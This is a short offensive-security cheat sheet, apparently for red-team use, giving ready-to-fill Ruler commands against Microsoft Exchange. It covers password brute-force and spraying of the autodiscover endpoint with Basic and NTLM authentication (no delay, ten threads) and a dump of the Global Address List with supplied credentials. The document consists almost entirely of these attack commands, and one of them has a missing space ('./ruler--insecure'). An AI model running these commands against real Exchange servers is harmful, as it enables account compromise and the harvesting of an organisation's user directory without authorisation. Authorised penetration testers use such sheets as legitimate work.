# ruler
% exchange
#plateform/linux  #target/remote  #protocol/exchange 


## autodiscover brute-force (basic auth)
#cat/ATTACK/BRUTEFORCE-SPRAY 
```bash
./ruler --basic --insecure --nocache --url  https://<fqdn>/autodiscover/autodiscover.xml -d <domain_fqdn>   brute --users ./users.txt --passwords <password_wl> --verbose  --delay 0  --stop --threads 10
```

## autodiscover brute-force(NTLM auth)
#cat/ATTACK/BRUTEFORCE-SPRAY 
```bash
./ruler--insecure --nocache --url  https://<fqdn>/autodiscover/autodiscover.xml -d <domain_fqdn>   brute --users ./users.txt --passwords <password_wl> --verbose  --delay 0  --stop --threads 10
```

## GAL dumping
#cat/ATTACK/EXPLOIT 
```bash
 ./ruler -k -d <domain_fqdn> -u <user> -p '<password>' -e <email> --verbose abk dump -o <out_file|gal.txt>
```